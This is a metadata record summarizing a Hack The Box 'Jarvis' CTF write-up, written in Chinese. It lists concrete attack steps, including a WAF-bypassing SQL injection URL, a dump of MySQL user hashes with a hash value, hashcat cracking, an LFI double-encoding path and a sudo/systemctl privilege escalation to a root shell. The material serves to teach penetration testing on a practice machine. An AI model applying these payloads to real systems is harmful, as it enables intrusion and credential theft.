...
- mysql_user_hash_dump
- hashcat_john_imissyou
- lfi_php_filter
- sudo_pepper_simpler_py
- ping_injection_systemctl
- lfi_253f_double_encoding
- sqli_mysql
...
quality: high
full_path: '[HTB]_Jarvis_Writeup.full.md'
meta_path: '[HTB]_Jarvis_Writeup.meta.md'
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '[HTB] Jarvis Writeup。HTB Jarvis: supersecurehotel 房型 SQL 注入 IronWAF bypass + mysql.user 哈希 hashcat 爆 + phpmyadmin 写 shell + LFI 双编码绕 check + sudo -u pepper simpler.py 反弹 root。。经验：IronWAF 2.0.3 用 /*...'
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/89735.html
reasoning_chain:
- 触发点:supersecurehotel.htb 80 端口 + IronWAF 2.0.3 → 假设:WAF 绕空格检测 → 动作:/**/ 替代空格
- 动作:GET /room.php?cod=-1/**/union/**/select/**/1,2,({0}),4,5,6,7%23 → 观察:SQL 注入成功
- 动作:order by 7 + union select 1,2,(subquery),4,5,6,7 → 观察:7 列确认 + 子查询可注入
- 动作:select group_concat(host,0x3a,user,0x3a,password) from mysql.user → 观察:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
- 动作:hashcat + imissyou 字典 → 观察:DBadmin 密码 imissyou
- 触发点:64999 端口 phpmyadmin 暴露 → 假设:可写 PHP shell → 动作:DBadmin 登录 phpmyadmin + 写 PHP
- 动作:/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxx LFI 双编码绕 check → 观察:得到 www-data
- 动作:sudo -l pepper:ALL /var/www/Admin-Utilities/simpler.py → 观察:simpler.py 可 sudo
- 动作:TF=$(mktemp).service; systemctl link/enable --now → 观察:反弹 root → 完成
failed_attempts:
- 试图直接 phpmyadmin 写 PHP → 失败:phpmyadmin 目录权限限制
- 试图单编码 %3f LFI → 失败:file_exists() 检测 %3f 解码
- 试图 simpler.py -c 'bash' → 失败:simpler.py 输入过滤 & | ; -
key_observations:
- IronWAF 2.0.3 用 /**/ 绕空格检测
- LFI 路径中 %253f (双 URL 编码) 绕 check 内 file_exists()
- sudo -l NOPASSWD:simpler.py 用 $() 绕 & ` | ; - 字符黑名单是经典 sudo 提权
- mysql.user 密码 hash 用 hashcat + 字典爆破是 HTB 标配
- phpmyadmin LFI 配合 PHP session 文件包含是经典 HTB web→root 链
prerequisites:
- SQL 注入 + IronWAF bypass
- hashcat 字典爆破 MySQL hash
- LFI 双编码绕 file_exists()
- sudo 提权 (systemctl link/enable)
---
# [HTB] Jarvis Writeup
